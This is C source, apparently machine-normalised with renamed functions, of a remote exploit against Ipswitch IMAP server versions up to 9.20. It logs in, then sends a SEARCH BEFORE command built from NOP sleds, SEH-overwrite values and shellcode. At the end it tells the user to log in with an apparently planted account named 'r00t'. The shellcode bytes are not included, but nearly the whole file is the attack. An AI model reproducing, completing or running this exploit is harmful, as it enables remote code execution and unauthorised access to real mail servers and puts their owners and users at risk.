#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct timeval {int tv_sec; scalar_t__ tv_usec; } ;
struct TYPE_2__ {void* s_addr; } ;
struct sockaddr_in {int /*<<< orphan*/  sin_port; TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
struct fd_set {int dummy; } ;
typedef  int /*<<< orphan*/  server ;
typedef  int /*<<< orphan*/  recvbuf ;
typedef  int /*<<< orphan*/  payload ;
typedef  int /*<<< orphan*/  auth ;
typedef  int /*<<< orphan*/  WSADATA ;
typedef  scalar_t__ SOCKET ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 scalar_t__ FUNC0 (scalar_t__,struct fd_set*) ; 
 int /*<<< orphan*/  FUNC1 (scalar_t__,struct fd_set*) ; 
 int /*<<< orphan*/  FUNC2 (struct fd_set*) ; 
 scalar_t__ INVALID_SOCKET ; 
 int /*<<< orphan*/  FUNC3 (int,int /*<<< orphan*/ ) ; 
 scalar_t__ SOCKET_ERROR ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/  FUNC4 (int) ; 
 int /*<<< orphan*/  FUNC5 (scalar_t__,struct sockaddr*,int,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 scalar_t__ FUNC6 (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int FUNC7 (char*) ; 
 int /*<<< orphan*/  FUNC8 (char*) ; 
 int /*<<< orphan*/  FUNC9 (int /*<<< orphan*/ ,char*,...) ; 
 void* FUNC10 (int) ; 
 int /*<<< orphan*/  FUNC11 (int) ; 
 int FUNC12 (char*) ; 
 int /*<<< orphan*/  FUNC13 (char*,int /*<<< orphan*/ ,int) ; 
 char* nextseh ; 
 int /*<<< orphan*/  FUNC14 (scalar_t__,char*,int,int /*<<< orphan*/ ) ; 
 char* seh ; 
 int /*<<< orphan*/  FUNC15 (scalar_t__,int /*<<< orphan*/ *,struct fd_set*,int /*<<< orphan*/ *,struct timeval*) ; 
 scalar_t__ FUNC16 (scalar_t__,char*,int,int /*<<< orphan*/ ) ; 
 char* shellcode ; 
 scalar_t__ FUNC17 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  FUNC18 (char*,char*) ; 
 int FUNC19 (char*) ; 
 int /*<<< orphan*/  FUNC20 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC21 () ; 

int FUNC22(int argc, char *argv[])
{
	SOCKET s;
	struct fd_set mask;
	struct timeval timeout; 
	struct sockaddr_in server;

	char user[20], pass[20];
	char payload[2048];
	char recvbuf[1024];
	if(argc < 4)
	{
		FUNC21();
		return 0;
	}

	if((FUNC19(argv[3])<15) && (FUNC19(argv[4])<15))
	{
		FUNC20(user, argv[3], 14);
		FUNC20(pass, argv[4], 14);
		user[14] = '\0';
		pass[14] = '\0';
	}
	else {
		FUNC21();
		return 0;
	}

	int ipaddr=FUNC10(FUNC12(argv[1])), port=FUNC7(argv[2]);;

	FUNC9(stderr, "Ipsbitch vs Ipswitch IMAP <=v9.20\n(C) dmc <dmc@deadbeef.co.uk>\n\n");

	char auth[50];
	FUNC13(auth, 0, sizeof(auth));
	FUNC13(recvbuf, 0, sizeof(recvbuf));
	FUNC18(auth, "0 LOGIN ");
	FUNC18(auth, user);
	FUNC18(auth, " ");
	FUNC18(auth, pass);
	FUNC18(auth, "\r\n");
	FUNC18(auth, "\0");

	FUNC13(payload, 0, sizeof(payload));
	FUNC18(payload, "2 SEARCH BEFORE ");
	for(int i=0; i<80; i++) FUNC18(payload, "\x90");
	FUNC18(payload, nextseh);
	FUNC18(payload, seh);
	for(int i=0; i<100; i++) FUNC18(payload, "\x90");
	FUNC18(payload, shellcode);
	for(int i=0; i<300; i++) FUNC18(payload, "\x90");
	FUNC18(payload, "\r\n");

	WSADATA info;
    if (FUNC6(FUNC3(2,0), &info)) FUNC8("Unable to start WSA");

	s=FUNC17(AF_INET,SOCK_STREAM,0);
	if (s==INVALID_SOCKET) FUNC8("[*] socket error");
	server.sin_family=AF_INET;
	server.sin_addr.s_addr=FUNC10(ipaddr);
	server.sin_port=FUNC11(port);	

	FUNC5(s,(struct sockaddr *)&server,sizeof(server),NULL,NULL,NULL,NULL);
	timeout.tv_sec=3;timeout.tv_usec=0;FUNC2(&mask);FUNC1(s,&mask);

	FUNC15(s+1,NULL,&mask,NULL,&timeout);
	if(FUNC0(s,&mask))
		{
			FUNC9(stderr, "[*] Connecting to IMAP server\n");
			FUNC4(1000);FUNC14(s,recvbuf,200,0);
			FUNC9(stderr, "[*] Got banner:\n%s\n", recvbuf);
			FUNC13(recvbuf, 0, sizeof(recvbuf));
			FUNC9(stderr, "[*] Authenticating...\n");
			if (FUNC16(s,auth,FUNC19(auth),0)==SOCKET_ERROR) FUNC8("[*] error sending auth payload");
			FUNC13(auth, 0, sizeof(auth));
			FUNC4(1000);FUNC14(s,recvbuf,200,0);
			FUNC9(stderr, "[*] Received:\n%s\n", recvbuf);
			FUNC13(recvbuf, 0, sizeof(recvbuf));
			FUNC9(stderr, "[*] Sending SELECT command...\n");
			if (FUNC16(s,"1 SELECT INBOX\r\n",FUNC19("1 SELECT INBOX\r\n"),0)==SOCKET_ERROR) FUNC8("[*] error sending auth payload");
			FUNC4(1000);FUNC14(s,recvbuf,200,0);
			FUNC9(stderr, "[*] Received:\n%s\n", recvbuf);
			FUNC13(recvbuf, 0, sizeof(recvbuf));
			FUNC4(1000);FUNC14(s,recvbuf,200,0);
			FUNC9(stderr, "[*] Received:\n%s\n", recvbuf);
			FUNC9(stderr, "[*] Sending exploit payload...\n");
			if (FUNC16(s,payload,FUNC19(payload),0)==SOCKET_ERROR) FUNC8("[*] error sending exploit payload");
			FUNC13(payload, 0, sizeof(payload));
			FUNC9(stderr, "[*] Now try USER=r00t PASS=r00tr00t!!\n");
			return 0;
		}
}